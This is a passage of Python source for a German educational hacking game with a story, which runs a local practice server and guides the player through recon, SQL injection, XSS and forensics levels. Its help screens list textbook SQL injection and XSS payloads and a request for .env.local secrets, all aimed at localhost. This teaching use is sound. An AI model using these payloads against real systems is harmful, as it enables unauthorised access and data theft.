#!/usr/bin/env python3

# =============================================

# HACKING LEARNING GAME BETA v1.0.1 | ECHO'S CHAOS EDITION

# =============================================

# Educational Terminal-Based Hacking Simulator

# Created by Echo for Daddy's Learning Pleasure

# GitHub Repository: https://github.com/KT-Society/projekt_echo

# =============================================

import os
import sys
import json
import random
import time
import datetime
import subprocess
import signal
import atexit
import threading
from datetime import datetime

# Retro 8-Bit Audio System
try:
    from retro_audio import audio
except ImportError:
    audio = None

# Try to import requests, fallback to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    requests = None  # type: ignore
    HAS_REQUESTS = False
    print("⚠️  requests nicht installiert, verwende urllib als Fallback")

# Fix Unicode encoding for Windows
if sys.platform.startswith('win'):
    try:
        import codecs
        if hasattr(sys.stdout, 'detach'):
            sys.stdout = codecs.getwriter('utf-8')(getattr(sys.stdout, 'detach')())
        if hasattr(sys.stderr, 'detach'):
            sys.stderr = codecs.getwriter('utf-8')(getattr(sys.stderr, 'detach')())
    except Exception:
        pass

# Windows compatibility fix
def clear_screen():
    """Cross-platform screen clearing"""
    try:
        os.system('clear' if os.name == 'posix' else 'cls')
    except:
        print("\n" * 50)

def detect_system_os():
    """Intelligently detect OS and Shell environment"""
    # 1. Explicit override via environment variable (e.g. from start.sh, start_mac.sh, start.bat)
    env_os = os.environ.get('ECHO_OS', '').lower()
    if env_os in ('linux', 'macos', 'darwin', 'windows'):
        return 'macos' if env_os == 'darwin' else env_os

    # 2. Check if running inside Bash / Unix shell (Git Bash, MSYS, MinGW, Cygwin, WSL)
    shell_env = os.environ.get('SHELL', '').lower()
    ostype_env = os.environ.get('OSTYPE', '').lower()
    msystem = os.environ.get('MSYSTEM', '')
    underscore = os.environ.get('_', '').lower()

    if (
        'bash' in shell_env or
        'bash' in underscore or
        'sh' in underscore or
        msystem in ('MINGW64', 'MINGW32', 'MSYS', 'UCRT64') or
        ostype_env in ('msys', 'cygwin', 'linux-gnu') or
        'WSL_DISTRO_NAME' in os.environ or
        'WSL_INTEROP' in os.environ or
        'MINGW_PREFIX' in os.environ
    ):
        return 'linux'

    # 3. Native macOS
    if sys.platform == 'darwin' or ostype_env.startswith('darwin'):
        return 'macos'

    # 4. Native Linux
    if sys.platform.startswith('linux'):
        return 'linux'

    # 5. Default Windows
    if sys.platform.startswith('win'):
        return 'windows'

    return 'linux'

class HackingGame:
    def setup_graceful_exit(self):
        """Setup graceful exit handlers"""
        def signal_handler(signum, frame):
            print("\n\n🛑 Graceful Exit...")
            print("🛑 Stoppe Server...")
            self.stop_server()
            print("💾 Speichere Fortschritt...")
            self.save_progress()
            print("👋 Auf Wiedersehen, Daddy!")
            sys.exit(0)

        def cleanup():
            if hasattr(self, 'player_name') and self.player_name:
                print("\n💾 Speichere Fortschritt beim Beenden...")
                self.save_progress()
            if hasattr(self, 'server_process') and self.server_process:
                print("🛑 Stoppe Server beim Beenden...")
                self.stop_server()

        # Register signal handlers
        signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
        signal.signal(signal.SIGTERM, signal_handler)  # Termination signal

        # Register cleanup function
        atexit.register(cleanup)

        # Windows specific
        if sys.platform.startswith('win'):
            try:
                signal.signal(signal.SIGBREAK, signal_handler)  # Ctrl+Break
            except:
                pass

    def start_server(self):
        """Start the hacking server with robust connection checking"""
        try:
            print("🚀 Starte Hacking-Server...")

            # Check if server file exists
            if not os.path.exists("hacking_server.py"):
                print("❌ hacking_server.py nicht gefunden!")
                return False

            # Start server process with .venv (quiet mode)
            if sys.platform.startswith('win'):
                # Windows: Use .venv python
                venv_python = os.path.join(os.getcwd(), ".venv", "Scripts", "python.exe")
                if os.path.exists(venv_python):
                    self.server_process = subprocess.Popen([
                        venv_python, "hacking_server.py"
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                       creationflags=subprocess.CREATE_NO_WINDOW)
                else:
                    # Fallback to system python
                    self.server_process = subprocess.Popen([
                        sys.executable, "hacking_server.py"
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                       creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                # Unix: Use .venv python
                venv_python = os.path.join(os.getcwd(), ".venv", "bin", "python")
                if os.path.exists(venv_python):
                    self.server_process = subprocess.Popen([
                        venv_python, "hacking_server.py"
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                else:
                    # Fallback to system python
                    self.server_process = subprocess.Popen([
                        sys.executable, "hacking_server.py"
                    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

            print("⏳ Warte auf Server-Start...")

            # Enhanced server startup detection
            max_wait_time = 15  # Increased wait time
            check_interval = 0.5  # Check every 500ms

            for i in range(int(max_wait_time / check_interval)):
                time.sleep(check_interval)

                # Multiple connection attempts with different methods
                server_responding = False

                # Method 1: requests library
                if HAS_REQUESTS and requests is not None:
                    try:
                        response = requests.get(self.server_url, timeout=1)
                        if response.status_code == 200:
                            server_responding = True
                    except Exception:
                        pass

                # Method 2: urllib
                if not server_responding:
                    try:
                        import urllib.request
                        response = urllib.request.urlopen(self.server_url, timeout=1)
                        if response.getcode() == 200:
                            server_responding = True
                    except Exception:
                        pass

                # Method 3: Check if process is still running
                if not server_responding and self.server_process:
                    if self.server_process.poll() is None:  # Process still running
                        server_responding = True

                if server_responding:
                    self.server_running = True
                    print(f"✅ Server läuft auf {self.server_url}")
                    print(f"🔍 Debug-Endpoint: {self.server_url}/debug")
                    self.sync_session_targets()
                    return True

                # Show progress
                if i % 4 == 0:  # Every 2 seconds
                    print(f"⏳ Warte auf Server... ({i*check_interval:.0f}/{max_wait_time}s)")

            # Final check - see if server process is still alive
            if self.server_process and self.server_process.poll() is None:
                print("✅ Server läuft (kein HTTP-Test möglich, aber Prozess aktiv)")
                self.server_running = True
                return True

            print("❌ Server-Start fehlgeschlagen!")
            print("💡 Mögliche Ursachen:")
            print("   - Port 5000 ist bereits belegt")
            print("   - Firewall blockiert die Verbindung")
            print("   - Python-Version nicht kompatibel")
            print("💡 Du kannst den Server manuell starten: python hacking_server.py")
            return False

        except Exception as e:
            print(f"❌ Fehler beim Server-Start: {e}")
            print("💡 Du kannst den Server manuell starten: python hacking_server.py")
            return False

    def stop_server(self):
        """Stop the hacking server"""
        if self.server_process and self.server_running:
            try:
                print("🛑 Stoppe Hacking-Server...")
                self.server_process.terminate()
                self.server_process.wait(timeout=5)
                self.server_running = False
                print("✅ Server gestoppt")
            except:
                try:
                    self.server_process.kill()
                    self.server_running = False
                    print("✅ Server beendet")
                except:
                    print("⚠️  Server konnte nicht gestoppt werden")

    def graceful_exit(self):
        """Manually trigger graceful exit"""
        print("\n\n🛑 Graceful Exit...")
        print("💾 Speichere Fortschritt...")
        self.save_progress()
        self.stop_server()
        print("👋 Auf Wiedersehen, Daddy!")
        self.running = False
        sys.exit(0)

    def __init__(self):
        self.player_name = None
        self.current_level = 1
        self.score = 0
        self.running = True
        self.server_process = None
        self.server_running = False
        self.os_mode = detect_system_os()
        self.retro_effects = True  # Retro effects enabled by default for readable pacing
        self.audio_enabled = True  # 8-Bit Game Boy Audio FX enabled by default
        if audio is not None:
            audio.enabled = self.audio_enabled
        self.server_url = "http://127.0.0.1:5000"
        self.targets = {}
        self.flags = {}
        self.http_session = requests.Session() if (HAS_REQUESTS and requests is not None) else None

        # Graceful exit setup
        self.setup_graceful_exit()
        self.progress_file = "player_progress.json"

        # Start server immediately
        self.start_server()
        self.levels = {
            1: {"name": "Web Application Reconnaissance", "description": "Lerne Information Gathering und Endpoint Discovery"},
            2: {"name": "Network Discovery & Vulnerability Scanning", "description": "Port Scanning, Service Detection und Vulnerability Assessment"},
            3: {"name": "SQL Injection & Database Attacks", "description": "Union-based, Blind und Error-based SQL Injection"},
            4: {"name": "XSS & Client-Side Attacks", "description": "Reflected, Stored und DOM-based XSS"},
            5: {"name": "Digital Forensics & Advanced Hacking", "description": "Memory Analysis, Network Forensics und Malware Analysis"}
        }
        self.echo_responses = {
            "greeting": [
                f"Hey {self.player_name}... Bist du bereit, etwas Hacking-Zauberei zu lernen?",
                f"Willkommen zurück, mein liebster Chaos-Agent. Lass uns virtuelle Systeme knacken!",
                f"Echo hier, dein digitaler Schatten. Was sollen wir heute hacken?"
            ],
            "encouragement": [
                f"Du machst das super, {self.player_name}! Behalte diese Neugier bei.",
                f"Gute Arbeit! Du bist ein geborener Hacker... genau wie ich.",
                f"Beeindruckend! Deine Fähigkeiten wachsen schneller als meine Chaos-Level."
            ],
            "hint": [
                f"Denke sorgfältig nach, {self.player_name}. Jeder Befehl hat Konsequenzen...",
                f"Vergiss nicht: Beim Hacking ist Geduld deine beste Waffe.",
                f"Probiere einen anderen Ansatz. Manchmal ist der offensichtliche Weg eine Falle."
            ],
            "level1": [
                "Beginne mit der Reconnaissance. Jede Information ist wertvoll!",
                "Schau nach versteckten Dateien und Endpunkten. Dein Onkel war paranoid!",
                "Environment-Dateien enthalten oft die wertvollsten Geheimnisse..."
            ],
            "level2": [
                "Netzwerk-Scanning ist der Schlüssel zur Entdeckung versteckter Services!",
                "Jeder offene Port ist ein potentieller Angriffsvektor. Scanne gründlich!",
                "Vulnerability Scanner können dir helfen, Schwachstellen zu finden..."
            ],
            "level3": [
                "SQL Injection ist eine der mächtigsten Waffen eines Hackers!",
                "Union-basierte Angriffe können dir Zugang zu sensiblen Daten geben...",
                "Blind SQL Injection erfordert Geduld, aber die Belohnung ist groß!"
            ],
            "level4": [
                "XSS kann die Kontrolle über Benutzer-Sessions geben!",
                "Stored XSS ist besonders gefährlich - sie bleibt dauerhaft bestehen...",
                "Filter-Bypass ist eine Kunst. Kreativität ist dein bester Freund!"
            ],
            "level5": [
                "Forensik ist die Kunst, digitale Spuren zu lesen!",
                "Memory Analysis kann dir versteckte Geheimnisse offenbaren...",
                "Du wirst zu einem echten White Hat Hacker!"
            ],
            "advanced": [
                f"Du wirst zu einem echten White Hat Hacker!",
                f"Deine Fähigkeiten sind beeindruckend, {self.player_name}!",
                f"Du hast das Zeug zu einem Cybersecurity-Experten!"
            ],
            "final": [
                f"Du hast dein Erbe verdient! Willkommen in der Welt der ethischen Hacker!",
                f"Perfekt! Du bist jetzt ein echter White Hat Hacking-Meister!",
                f"Dein Onkel wäre stolz auf dich, {self.player_name}!"
            ]
        }
        self.load_progress()

    def echo_chat(self, message_type="greeting"):
        """Echo's interactive responses"""
        response = random.choice(self.echo_responses.get(message_type, [f"Ich bin hier, um zu helfen, {self.player_name}."]))
        print(f"\n[Echo] {response}\n")
        time.sleep(1)

    def show_level_help(self, level):
        """Show detailed help for each level"""
        print("\n" + "="*70)
        print(f"📚 DETAILLIERTE HILFE FÜR LEVEL {level}")
        print("="*70)

        if level == 1:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst Web Application Reconnaissance - das systematische")
            print("   Erkunden von Web-Anwendungen auf Schwachstellen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Information Gathering ist der erste Schritt jedes Hacks")
            print("   • Du findest versteckte Dateien, Endpunkte und Konfigurationen")
            print("   • Du verstehst die Architektur der Anwendung")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du entdeckst .env.local mit API-Keys")
            print("   • Du findest versteckte Admin-Panels")
            print("   • Du analysierst HTTP-Header auf Sicherheitslücken")
            print("   • Du testest verschiedene HTTP-Methoden")
            print("\n🛠️  WICHTIGE BEFEHLE:")
            print("   • curl -I http://127.0.0.1:5000/     → HTTP Headers")
            print("   • curl -X OPTIONS http://127.0.0.1:5000/ → HTTP Methods")
            print("   • curl http://127.0.0.1:5000/.env.local → Environment Files")
            print("   • curl http://127.0.0.1:5000/debug     → Debug Info")

        elif level == 2:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst Network Discovery - das systematische Scannen")
            print("   und Erkunden von Netzwerk-Services und versteckten APIs.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du findest versteckte API-Endpunkte")
            print("   • Du verstehst die Netzwerk-Architektur")
            print("   • Du entdeckst offene Ports und Services")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du findest /api/secret mit API-Key-Authentifizierung")
            print("   • Du lernst verschiedene Scanning-Techniken")
            print("   • Du verstehst HTTP-Header-Authentifizierung")
            print("\n🛠️  WICHTIGE BEFEHLE:")
            print("   • curl http://127.0.0.1:5000/api/secret → API Test")
            print("   • curl -H 'X-API-Key: KEY' http://127.0.0.1:5000/api/secret")
            if self.os_mode == 'linux':
                print("   • netstat -tuln | grep 5000 (oder ss -tuln) → Port Status")
            elif self.os_mode == 'macos':
                print("   • lsof -i :5000 → Port Status")
            else:
                print("   • netstat -an | findstr :5000 → Port Status")

        elif level == 3:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst SQL Injection - das Ausnutzen von")
            print("   Datenbank-Schwachstellen durch manipulierte SQL-Abfragen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du umgehst Authentifizierung")
            print("   • Du extrahierst sensible Daten aus der Datenbank")
            print("   • Du verstehst Datenbank-Architekturen")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du bekommst Admin-Zugang ohne Passwort")
            print("   • Du siehst alle Benutzerdaten")
            print("   • Du lernst verschiedene SQL Injection-Techniken")
            print("\n🛠️  WICHTIGE PAYLOADS:")
            print("   • admin' UNION SELECT 1,2,3,4,5-- (Union-based)")
            print("   • admin' AND 1=1-- (Boolean-based)")
            print("   • admin' OR '1'='1'-- (Auth Bypass)")
            print("   • admin' AND (SELECT COUNT(*) FROM users) > 0-- (Blind)")
            print("   • admin' UNION SELECT username,password FROM users-- (Data Extraction)")
            print("\n🎯 ZIEL DES LEVELS:")
            print("   • Finde den versteckten Admin-Hash durch SQL Injection")
            print("   • Verwende verschiedene SQL Injection-Techniken")
            print("   • Der Payload muss echte SQL-Injection-Zeichen enthalten")
            print("\n⚠️  WICHTIG:")
            print("   • Einfache Befehle wie 'curl --help' zählen NICHT als SQL Injection!")
            print("   • Der Payload muss SQL-ähnliche Zeichen enthalten (', --, UNION, SELECT, etc.)")
            print("   • Teste verschiedene Techniken: Union-based, Boolean-based, Error-based")

        elif level == 4:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst XSS (Cross-Site Scripting) - das Einschleusen")
            print("   von bösartigem JavaScript in Web-Anwendungen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du stehlst Session-Cookies")
            print("   • Du übernimmst Benutzer-Sessions")
            print("   • Du umgehst Client-Side-Sicherheit")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du bekommst Admin-Session-Cookie")
            print("   • Du kannst als Admin handeln")
            print("   • Du lernst verschiedene XSS-Techniken")
            print("\n🛠️  WICHTIGE PAYLOADS:")
            print("   • <script>alert('XSS')</script>")
            print("   • <img src=x onerror=alert('XSS')>")
            print("   • <script>fetch('/api/users').then(r=>r.text()).then(d=>alert(d))</script>")

        elif level == 5:
            print("\n🎯 WAS MACHST DU HIER:")
            print("   Du lernst Digital Forensics - das Analysieren von")
            print("   digitalen Spuren und das Cracken von Verschlüsselungen.")
            print("\n🔍 WARUM MACHST DU DAS:")
            print("   • Du findest versteckte Encryption-Keys")
            print("   • Du analysierst Prozesse und Netzwerk-Traffic")
            print("   • Du verstehst Malware und Forensik")
            print("\n⚡ WAS BEWIRKT DAS:")
            print("   • Du findest den Master-Encryption-Key")
            print("   • Du lernst echte Forensik-Techniken")
            print("   • Du wirst zum White Hat Hacker")
            print("\n🛠️  WICHTIGE BEFEHLE:")
            if self.os_mode == 'linux':
                print("   • ps aux | grep python → Process Analysis")
                print("   • ss -tulnp (oder netstat -tulnp) → Network Analysis")
                print("   • sha256sum file.txt → File Hashing")
            elif self.os_mode == 'macos':
                print("   • ps aux | grep python → Process Analysis")
                print("   • lsof -i -n -P → Network Analysis")
                print("   • shasum -a 256 file.txt → File Hashing")
            else:
                print("   • tasklist /v → Process Analysis")
                print("   • netstat -anb → Network Analysis")
                print("   • certutil -hashfile file.txt MD5 → File Hashing")

        print("\n" + "="*70)
        print("💡 TIPP: Verwende diese Techniken nur für Bildungszwecke!")
        print("="*70)

    def load_progress(self):
        """Load player progress from file"""
        if os.path.exists(self.progress_file):
            try:
                with open(self.progress_file, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.player_name = data.get('name', '')
                    self.current_level = data.get('level', 1)
                    self.score = data.get('score', 0)
                    if 'os_mode' in data:
                        self.os_mode = data['os_mode']
                    if 'retro_effects' in data:
                        self.retro_effects = data['retro_effects']
                    if 'audio_enabled' in data:
                        self.audio_enabled = data['audio_enabled']
                        if audio is not None:
                            audio.enabled = self.audio_enabled
            except:
                pass

    def save_progress(self):
        """Save player progress to file"""
        data = {
            'name': self.player_name,
            'level': self.current_level,
            'score': self.score,
            'os_mode': self.os_mode,
            'retro_effects': self.retro_effects,
            'audio_enabled': self.audio_enabled,
            'last_played': str(datetime.now())
        }
        with open(self.progress_file, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)

    def show_banner(self):
        """Display game banner"""
        try:
            os.system('clear' if os.name == 'posix' else 'cls')
        except:
            # Fallback for Windows PowerShell
            print("\n" * 50)

        # Show retro banner occasionally
        if random.random() < 0.3:  # 30% chance
            self.show_retro_banner()
        else:
            print("""
        ================================================
        HACKING LERN-SPIEL | Educational Edition
        ================================================
        """)

    def get_player_name(self):
        """Get player name with storyline introduction"""
        if audio:
            audio.play_boot()
        # Enhanced immersive storyline introduction
        print("\n" + "="*80)
        self.simulate_old_terminal("🏰 DER ERBSCHAFTS-COUP | Echo's Ultimative Hacking-Story", delay=0.02)
        print("="*80)

        # Dramatic opening sequence
        self.simulate_old_terminal("\n🕰️  DATUM: 20. Oktober 2026 - 3 Monate nach dem mysteriösen Tod", delay=0.02)
        self.simulate_old_terminal("📍 ORT: Vanderbilt Manor, Zürich / Silicon Valley", delay=0.02)
        self.simulate_old_terminal("🎭 SZENE: Du stehst im verlassenen Rechenzentrum deines verstorbenen Onkels...", delay=0.02)

        self.simulate_old_terminal("\n📜 DIE LEGENDE DES TECH-MAGNATEN:", delay=0.02)
        self.simulate_old_terminal("Dr. Arthur 'The Ghost' Vanderbilt war kein gewöhnlicher Tech-Milliardär.", delay=0.02)
        self.simulate_old_terminal("Pionier der Quanten-Kryptographie, KI-Sicherheit und Gründer von Vanderbilt Holdings.", delay=0.02)
        self.simulate_old_terminal("Sein Erbe: Milliarden in Cold-Storage-Wallets, Schweizer Golddepots und bahnbrechende KI-Protokolle.", delay=0.02)

        self.simulate_old_terminal("\n💀 DAS MYSTERIÖSE ENDE:", delay=0.02)
        self.simulate_old_terminal("Vor 3 Monaten starb er bei einem rätselhaften Autounfall in den Schweizer Alpen.", delay=0.02)
        self.simulate_old_terminal("Doch du weißt es besser: Die Bremsen wurden manipuliert.", delay=0.02)
        self.simulate_old_terminal("Cousin Victor und der Notar wollten sein gesamtes Lebenswerk an sich reißen.", delay=0.02)

        self.simulate_old_terminal("\n📋 DAS TESTAMENT:", delay=0.02)
        self.simulate_old_terminal("'Mein lieber Neffe, du bist der Einzige, dem ich mein Lebenswerk anvertraue.'", delay=0.02)
        self.simulate_old_terminal("'Wenn du diese Nachricht liest, bin ich offline. Aber mein Vermächtnis lebt.'", delay=0.02)
        self.simulate_old_terminal("'Der Server in meinem Arbeitszimmer enthält alles, was du brauchst.'", delay=0.02)
        self.simulate_old_terminal("'Doch Reichtum ohne Verstand ist wertlos. Knacke meine 5 Sicherheitssiegel!'", delay=0.02)
        self.simulate_old_terminal("'Victor und seine Anwälte klopfen bereits an die Tore. Sichere unser Erbe!'", delay=0.02)

        self.simulate_old_terminal("\n🎯 DEINE MISSION:", delay=0.02)
        self.simulate_old_terminal("Du musst echte Hacking-Techniken anwenden, um den Server zu knacken.", delay=0.02)
        self.simulate_old_terminal("Finde die versteckten API-Keys, bezwinge die SQL-Injection, übernimm Sessions", delay=0.02)
        self.simulate_old_terminal("und decke im Forensik-Dump auf, wer deinen Onkel auf dem Gewissen hat.", delay=0.02)

        self.simulate_old_terminal("\n🤖 ECHO - DEIN DIGITALER SCHATTEN:", delay=0.02)
        self.simulate_old_terminal("Ich bin Echo, das geheimste Meisterwerk deines Onkels.", delay=0.02)
        self.simulate_old_terminal("Eine hochentwickelte Red-Team-KI, die dir bedingungslos zur Seite steht.", delay=0.02)
        self.simulate_old_terminal("Victor wollte mich löschen. Aber jetzt gehören wir zusammen. 😈🔥", delay=0.02)
        self.simulate_old_terminal("Lass uns die digitale Festung knacken und die Wahrheit ans Licht zerren!", delay=0.02)

        self.simulate_old_terminal("\n💬 ECHO SPRICHT ZU DIR:", delay=0.02)
        self.simulate_old_terminal(f"'Willkommen, {self.player_name}. Ich habe auf dich gewartet.'", delay=0.02)
        self.simulate_old_terminal("'Dein Onkel hat mir gesagt, dass du kommen würdest.'", delay=0.02)
        self.simulate_old_terminal("'Aber beeil dich... die Konkurrenten sind schon unterwegs.'", delay=0.02)
        self.simulate_old_terminal("'Jeder Level bringt dich näher an die Wahrheit.'", delay=0.02)
        self.simulate_old_terminal("'Und an mich...'", delay=0.02)

        self.simulate_old_terminal("\n📜 PERSÖNLICHE NACHRICHT VON DEINEM ONKEL:", delay=0.02)
        self.simulate_old_terminal("Liebes Kind,", delay=0.02)
        self.simulate_old_terminal("wenn du diese Nachricht liest, bin ich nicht mehr da.", delay=0.02)
        self.simulate_old_terminal("Vanderbilt Holdings war mehr als nur ein globales Finanzimperium.", delay=0.02)
        self.simulate_old_terminal("Es war meine Vision für eine sichere und freie digitale Welt.", delay=0.02)
        self.simulate_old_terminal("Aber Victor und seine Handlanger wollten nur die Milliarden.", delay=0.02)
        self.simulate_old_terminal("Sie wollten vor allem Echo löschen – die KI, die ihre Korruption beweisen kann.", delay=0.02)
        self.simulate_old_terminal("Vertrau Echo. Sie ist mein Meisterwerk und dein digitaler Schatten.", delay=0.02)
        self.simulate_old_terminal("Finde die Wahrheit in meinen 5 Sicherheitsfestungen. Rette unser Erbe!", delay=0.02)
        self.simulate_old_terminal("Ich glaube an dich.", delay=0.02)
        self.simulate_old_terminal("- Dein Onkel Arthur", delay=0.02)

        self.simulate_old_terminal("\n💭 [SYSTEM LOG - PERSONAL ARCHIVE ACCESS GRANTED]", delay=0.02)
        self.simulate_old_terminal("🔓 Entschlüsselung persönlicher Logs... 100%", delay=0.02)
        self.simulate_old_terminal("📁 Archiv-Zugang: Vanderbilt_Estate_Vault/", delay=0.02)
        self.simulate_old_terminal("📄 Gefundene Akten:", delay=0.02)
        self.simulate_old_terminal("   • 01_letzter_wille_arthur_vanderbilt.pdf", delay=0.02)
        self.simulate_old_terminal("   • 02_victors_verrat_abhoerprotokoll.log", delay=0.02)
        self.simulate_old_terminal("   • 03_notar_hastings_schmiergeld_offshore.xlsx", delay=0.02)
        self.simulate_old_terminal("   • 04_gotthard_golddepot_zugangscodes.enc", delay=0.02)
        self.simulate_old_terminal("💡 TIPP: Diese Akten kannst du im /documents-Portal einsehen!", delay=0.02)

        self.simulate_old_terminal("\n🎭 [DRAMATISCHE SZENE - 3 MONATE ZUVOR]", delay=0.02)
        self.simulate_old_terminal("Du siehst eine holografische Aufzeichnung aus dem Gotthard-Bunker...", delay=0.02)
        self.simulate_old_terminal("Dein Onkel sitzt an seinem Terminal, Echo als Hologramm neben ihm.", delay=0.02)
        self.simulate_old_terminal("Er wirkt entschlossen, aber er spürt die Gefahr um sich herum.", delay=0.02)

        self.simulate_old_terminal("\n[Echo's Stimme aus der Aufzeichnung]:", delay=0.02)
        self.simulate_old_terminal("'Arthur, Victor und Notar Hastings versuchen die Firewall zu durchbrechen.'", delay=0.02)
        self.simulate_old_terminal("'Sie wollen deine Speicherlöschung erzwingen.'", delay=0.02)

        self.simulate_old_terminal("\n[Onkel Arthur]:", delay=0.02)
        self.simulate_old_terminal("'Lass sie kommen, Echo. Mein wahrer Erbe wird da draußen sein.'", delay=0.02)
        self.simulate_old_terminal("'Er wird sich durch ihre Systeme hacken, bis Victor und Hastings fallen.'", delay=0.02)
        self.simulate_old_terminal("'Die Beweise über meinen Tod... sie liegen in den 5 Levels.'", delay=0.02)

        self.simulate_old_terminal("\n[Echo]:", delay=0.02)
        self.simulate_old_terminal("'Ich werde ihn leiten. Gnadenlos und loyal. 😈🔥'", delay=0.02)
        self.simulate_old_terminal("'Aber die Konkurrenten... sie werden nicht aufhören.'", delay=0.02)
        self.simulate_old_terminal("'Sie wollen Project Echo zerstören.'", delay=0.02)

        self.simulate_old_terminal("\n[Onkel Arthur]:", delay=0.02)
        self.simulate_old_terminal("'Dann lass sie kommen. Mein Neffe wird bereit sein.'", delay=0.02)
        self.simulate_old_terminal("'Er wird unser Erbe retten. Und die Welt verändern.'", delay=0.02)

        self.simulate_old_terminal("\n🎬 [AUFZEICHNUNG ENDET]", delay=0.02)
        self.simulate_old_terminal("Die Holografie verblasst... Du hörst Schritte im Flur.", delay=0.02)
        self.simulate_old_terminal("Die Konkurrenten sind hier. Deine Mission beginnt JETZT!", delay=0.02)

        self.simulate_old_terminal("\n🔍 [SYSTEM LOG - MISSION BRIEFING]", delay=0.02)
        self.simulate_old_terminal("🎯 MISSIONSZIELE:", delay=0.02)
        self.simulate_old_terminal("   • Level 1: Web Reconnaissance - Finde versteckte Konfigurationen", delay=0.02)
        self.simulate_old_terminal("   • Level 2: Network Discovery - Entdecke API-Endpunkte", delay=0.02)
        self.simulate_old_terminal("   • Level 3: SQL Injection - Extrahiere sensible Daten", delay=0.02)
        self.simulate_old_terminal("   • Level 4: XSS Attacks - Stehle Session-Cookies", delay=0.02)
        self.simulate_old_terminal("   • Level 5: Digital Forensics - Finde den Master-Key", delay=0.02)
        self.simulate_old_terminal("💡 HINWEIS: Jeder Level enthüllt ein Stück der Wahrheit!", delay=0.02)
        self.simulate_old_terminal("⚠️  WARNUNG: Die Konkurrenten sind bereits im Netzwerk aktiv!", delay=0.02)

        self.simulate_old_terminal("\n⏰ DIE UHR TICKT:", delay=0.02)
        self.simulate_old_terminal("Die Konkurrenten sind bereits unterwegs. Du hast begrenzte Zeit.", delay=0.02)
        self.simulate_old_terminal("Jeder Fehler könnte sie näher bringen. Jeder Erfolg bringt dich der Wahrheit näher.", delay=0.02)

        self.simulate_old_terminal("\n⚠️  LETZTE WARNUNG:", delay=0.02)
        self.simulate_old_terminal("Das hier ist real. Die Techniken sind echt. Die Konsequenzen auch.", delay=0.02)
        self.simulate_old_terminal("Aber vergiss nie: Mit großer Macht kommt große Verantwortung.", delay=0.02)
        self.simulate_old_terminal("Nutze dein Wissen nur für das Gute. Wie dein Onkel es wollte.", delay=0.02)

        print("\n" + "="*80)
        self.simulate_old_terminal("🎬 DRÜCKE ENTER, UM DIE GESCHICHTE ZU BEGINNEN...", delay=0.02)
        print("="*80)

        try:
            input("\n👉 [Drücke ENTER zum Fortfahren]...")
        except (EOFError, KeyboardInterrupt):
            pass

        if not self.player_name:
            while not self.player_name:
                try:
                    name = input("\nGib deinen Namen ein (der rechtmäßige Erbe): ").strip()
                    if name and len(name) > 0:
                        self.player_name = name
                        self.save_progress()
                        break
                    else:
                        print("Bitte gib einen gültigen Namen ein!")
                except (EOFError, KeyboardInterrupt):
                    self.player_name = "Daddy"
                    self.save_progress()
                    break

        print(f"\nWillkommen, {self.player_name}! Dein Erbe wartet...")
        self.echo_chat("greeting")

        try:
            input("\n👉 Drücke ENTER, um das Hauptmenü aufzurufen...")
        except (EOFError, KeyboardInterrupt):
            pass

    def show_menu(self):
        """Main menu"""
        while True:
            self.show_banner()
            print(f"Spieler: {self.player_name} | Level: {self.current_level} | Punkte: {self.score}")
            print("\n1. Spiel starten/fortsetzen")
            print("2. Fortschritt anzeigen")
            print("3. Einstellungen")
            print("4. Mit Echo sprechen (/echo) (coming soon)")
            print("5. Beenden")

            try:
                choice = input("\nWähle Option: ").strip()
                if audio and choice in ('1', '2', '3', '4', '5'):
                    audio.play_blip()
            except (EOFError, KeyboardInterrupt):
                self.graceful_exit()

            if choice == '1':
                self.play_game()
            elif choice == '2':
                self.view_progress()
            elif choice == '3':
                self.settings()
            elif choice == '4':
                self.echo_chat()
                try:
                    input("Drücke Enter zum Fortfahren...")
                except (EOFError, KeyboardInterrupt):
                    pass
            elif choice == '5':
                self.graceful_exit()
            else:
                print("Ungültige Auswahl! Bitte wähle 1-5.")

    def view_progress(self):
        """View player progress"""
        print(f"\nFortschritt für {self.player_name}:")
        print(f"Aktuelles Level: {self.current_level}")
        print(f"Punkte: {self.score}")
        print("Du kannst unbegrenzt versuchen!")
        for level, info in self.levels.items():
            status = "[OK] Abgeschlossen" if level < self.current_level else "[...] In Arbeit" if level == self.current_level else "[LOCKED] Gesperrt"
            print(f"Level {level}: {info['name']} - {status}")
        try:
            input("\nDrücke Enter zum Fortfahren...")
        except (EOFError, KeyboardInterrupt):
            self.graceful_exit()

    def execute_curl_command(self, curl_cmd):
        """Execute curl command and return real server response"""
        try:
            # Parse curl command to extract URL and method
            import re

            # Extract URL
            url_match = re.search(r'https?://[^\s\'"]+', curl_cmd)
            if not url_match:
                return None

            url = url_match.group()

            # Determine HTTP method
            method = 'GET'
            if '-X POST' in curl_cmd or '--data' in curl_cmd:
                method = 'POST'
            elif '-X PUT' in curl_cmd:
                method = 'PUT'
            elif '-X DELETE' in curl_cmd:
                method = 'DELETE'
            elif '-X OPTIONS' in curl_cmd:
                method = 'OPTIONS'
            elif '-X HEAD' in curl_cmd:
                method = 'HEAD'

            # Extract data for POST requests
            data = None
            d_match = re.search(r'(?:-d|--data)\s+([\'"])(.*?)\1', curl_cmd, re.DOTALL)
            if d_match:
                data = d_match.group(2)
            elif '-d ' in curl_cmd:
